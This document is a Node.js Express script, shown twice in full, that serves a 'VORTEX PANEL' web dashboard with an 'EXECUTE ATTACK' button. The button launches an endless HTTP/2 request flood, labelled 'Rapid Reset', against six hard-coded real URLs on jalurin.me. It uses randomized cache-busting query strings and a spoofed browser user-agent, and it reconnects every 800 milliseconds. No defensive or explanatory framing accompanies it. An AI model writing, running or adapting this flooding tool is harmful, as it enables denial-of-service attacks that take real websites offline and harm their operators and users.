const express = require('express');
const http2 = require('http2');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

let attacking = false;
let logs = [];
let targetList = [
    'https://jalurin.me/kode4d',
    'https://jalurin.me/testi138',
    'https://jalurin.me/sawit188',
    'https://jalurin.me/kilat69',
    'https://jalurin.me/wak5000',
    'https://jalurin.me/koi288'
];

// ENGINE VORTEX V7.1 (HTTP/2 FLOOD)
function startAttack(target) {
    if (!attacking) return;
    const url = new URL(target);
    const client = http2.connect(url.origin, { 
        settings: { enablePush: false, initialWindowSize: 65535 } 
    });

    client.on('error', () => {});

    for (let i = 0; i < 50; i++) {
        const path = url.pathname + (url.search || '?') + '&v=' + crypto.randomBytes(3).toString('hex');
        const req = client.request({
            ':method': 'GET',
            ':path': path,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'cache-control': 'no-cache'
        });

        req.on('error', () => {});
        req.on('response', (h) => {
            const status = h[':status'];
            const entry = `[${new Date().toLocaleTimeString()}] ${status} -> ${target}`;
            logs.unshift(entry);
            if (logs.length > 15) logs.pop();
        });
        req.end();
    }

    setTimeout(() => {
        if (!client.destroyed) client.destroy();
        if (attacking) startAttack(target);
    }, 800);
}

// ROUTE TAMPILAN PANEL
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>VORTEX PANEL V1</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
            .container { max-width: 600px; margin: auto; border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; border-radius: 10px; }
            h1 { text-align: center; text-shadow: 0 0 10px #00ff41; }
            .status { background: #111; padding: 10px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #333; }
            .btn { width: 100%; padding: 15px; margin: 5px 0; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; font-family: inherit; }
            .btn-start { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; }
            .btn-stop { background: #ff0000; color: #fff; box-shadow: 0 0 10px #ff0000; }
            .logs { background: #000; color: #00ff41; padding: 10px; border: 1px solid #00ff41; height: 250px; overflow-y: auto; font-size: 12px; margin-top: 20px; }
            marquee { background: #00ff41; color: #000; font-weight: bold; padding: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>VORTEX PANEL V1</h1>
            <marquee>SYSTEM READY - WAITING FOR COMMAND...</marquee>
            <div class="status">
                STATUS: <b style="color: ${attacking ? '#00ff41' : '#ff0000'}">${attacking ? 'STRIKING TARGETS...' : 'SYSTEM IDLE'}</b><br>
                ENGINE: HTTP/2 RAPID RESET (V7.1)
            </div>
            <button class="btn btn-start" onclick="location.href='/start'">EXECUTE ATTACK</button>
            <button class="btn btn-stop" onclick="location.href='/stop'">ABORT MISSION</button>
            
            <div class="logs" id="log-box">
                ${logs.map(l => `<div>${l}</div>`).join('')}
            </div>
        </div>
        <script>
            // Auto refresh log tiap 2 detik
            setInterval(() => { location.reload(); }, 2000);
        </script>
    </body>
    </html>
    `);
});

// LOGIC START/STOP
app.get('/start', (req, res) => {
    if (!attacking) {
        attacking = true;
        targetList.forEach(t => startAttack(t));
    }
    res.redirect('/');
});

app.get('/get-logs', (req, res) => {
    res.json(logs);
});

app.get('/stop', (req, res) => {
    attacking = false;
    res.redirect('/');
});

// Jalankan Server
app.listen(port, () => {
    console.log(`Web Vortex ON: http://localhost:${port}`);
});
const express = require('express');
const http2 = require('http2');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

let attacking = false;
let logs = [];
let targetList = [
    'https://jalurin.me/kode4d',
    'https://jalurin.me/testi138',
    'https://jalurin.me/sawit188',
    'https://jalurin.me/kilat69',
    'https://jalurin.me/wak5000',
    'https://jalurin.me/koi288'
];

// ENGINE VORTEX V7.1 (HTTP/2 FLOOD)
function startAttack(target) {
    if (!attacking) return;
    const url = new URL(target);
    const client = http2.connect(url.origin, { 
        settings: { enablePush: false, initialWindowSize: 65535 } 
    });

    client.on('error', () => {});

    for (let i = 0; i < 50; i++) {
        const path = url.pathname + (url.search || '?') + '&v=' + crypto.randomBytes(3).toString('hex');
        const req = client.request({
            ':method': 'GET',
            ':path': path,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'cache-control': 'no-cache'
        });

        req.on('error', () => {});
        req.on('response', (h) => {
            const status = h[':status'];
            const entry = `[${new Date().toLocaleTimeString()}] ${status} -> ${target}`;
            logs.unshift(entry);
            if (logs.length > 15) logs.pop();
        });
        req.end();
    }

    setTimeout(() => {
        if (!client.destroyed) client.destroy();
        if (attacking) startAttack(target);
    }, 800);
}

// ROUTE TAMPILAN PANEL
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>VORTEX PANEL V1</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
            .container { max-width: 600px; margin: auto; border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; border-radius: 10px; }
            h1 { text-align: center; text-shadow: 0 0 10px #00ff41; }
            .status { background: #111; padding: 10px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #333; }
            .btn { width: 100%; padding: 15px; margin: 5px 0; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; font-family: inherit; }
            .btn-start { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; }
            .btn-stop { background: #ff0000; color: #fff; box-shadow: 0 0 10px #ff0000; }
            .logs { background: #000; color: #00ff41; padding: 10px; border: 1px solid #00ff41; height: 250px; overflow-y: auto; font-size: 12px; margin-top: 20px; }
            marquee { background: #00ff41; color: #000; font-weight: bold; padding: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>VORTEX PANEL V1</h1>
            <marquee>SYSTEM READY - WAITING FOR COMMAND...</marquee>
            <div class="status">
                STATUS: <b style="color: ${attacking ? '#00ff41' : '#ff0000'}">${attacking ? 'STRIKING TARGETS...' : 'SYSTEM IDLE'}</b><br>
                ENGINE: HTTP/2 RAPID RESET (V7.1)
            </div>
            <button class="btn btn-start" onclick="location.href='/start'">EXECUTE ATTACK</button>
            <button class="btn btn-stop" onclick="location.href='/stop'">ABORT MISSION</button>
            
            <div class="logs" id="log-box">
                ${logs.map(l => `<div>${l}</div>`).join('')}
            </div>
        </div>
        <script>
            // Auto refresh log tiap 2 detik
            setInterval(() => { location.reload(); }, 2000);
        </script>
    </body>
    </html>
    `);
});

// LOGIC START/STOP
app.get('/start', (req, res) => {
    if (!attacking) {
        attacking = true;
        targetList.forEach(t => startAttack(t));
    }
    res.redirect('/');
});

app.get('/get-logs', (req, res) => {
    res.json(logs);
});

app.get('/stop', (req, res) => {
    attacking = false;
    res.redirect('/');
});

// Jalankan Server
app.listen(port, () => {
    console.log(`Web Vortex ON: http://localhost:${port}`);
});

